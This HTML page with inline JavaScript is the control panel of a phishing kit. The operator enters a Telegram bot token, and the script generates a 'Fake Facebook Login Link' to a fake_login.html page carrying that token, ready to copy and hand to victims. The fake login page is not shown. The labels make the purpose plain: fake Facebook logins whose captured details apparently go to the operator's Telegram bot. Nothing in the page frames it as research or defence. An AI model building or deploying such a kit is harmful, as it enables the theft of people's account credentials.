<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Bot Token</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        input, button {
            margin: 10px 0;
            padding: 10px;
            width: 100%;
            max-width: 300px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Telegram Bot Token</h1>
    <button id="showTokenInput">Add Bot Token</button>

    <div id="tokenInputSection" class="hidden">
        <input type="text" id="botToken" placeholder="Enter your Telegram Bot Token">
        <button id="submitToken">Submit</button>
    </div>

    <div id="fakeLoginLinkSection" class="hidden">
        <h2>Fake Facebook Login Link</h2>
        <p>Copy the link below and open it in another browser/tab:</p>
        <input type="text" id="fakeLoginLink" readonly>
        <button id="copyLink">Copy Link</button>
    </div>

    <script>
        // Show token input section
        document.getElementById('showTokenInput').addEventListener('click', function() {
            document.getElementById('tokenInputSection').classList.remove('hidden');
        });

        // Handle token submission
        document.getElementById('submitToken').addEventListener('click', function() {
            const botToken = document.getElementById('botToken').value;
            if (botToken) {
                // Generate fake login link
                const fakeLoginLink = `${window.location.origin}/fake_login.html?token=${encodeURIComponent(botToken)}`;
                document.getElementById('fakeLoginLink').value = fakeLoginLink;
                document.getElementById('fakeLoginLinkSection').classList.remove('hidden');
            } else {
                alert('Please enter a valid bot token.');
            }
        });

        // Copy link to clipboard
        document.getElementById('copyLink').addEventListener('click', function() {
            const linkInput = document.getElementById('fakeLoginLink');
            linkInput.select();
            document.execCommand('copy');
            alert('Link copied to clipboard!');
        });
    </script>
</body>
</html>
